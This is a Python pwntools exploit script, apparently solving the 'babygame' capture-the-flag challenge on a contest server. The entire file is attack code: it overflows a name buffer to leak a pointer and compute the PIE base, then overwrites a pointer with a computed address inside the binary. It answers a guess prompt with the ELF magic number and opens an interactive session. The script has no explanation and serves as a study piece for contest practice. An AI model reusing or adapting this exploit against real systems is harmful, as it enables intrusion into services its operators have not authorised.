from pwn import *
#p=process('./babygame')
p=remote('pwn-2021.duc.tf',31907)
#raw_input("DEBUG")
p.sendlineafter("Welcome, what is your name?\n","a"*31+"b")

p.sendlineafter("> ","2")
p.recvuntil("ab")
number = u64(p.recv(6)+"\x00"*2)
log.info("number: " + hex(number))
pie = number - 0x2024
log.info("pie: " + hex(pie))
bin_sh = pie + 0x20a3
log.info("bin_sh: "+hex(bin_sh))

p.sendlineafter("> ","1")
payload = "a"*32
payload += p64(bin_sh)
p.sendlineafter("to?\n",payload)

p.sendlineafter("> ","1337")
p.sendlineafter("> guess: ",str(0x464c457f))

p.interactive()
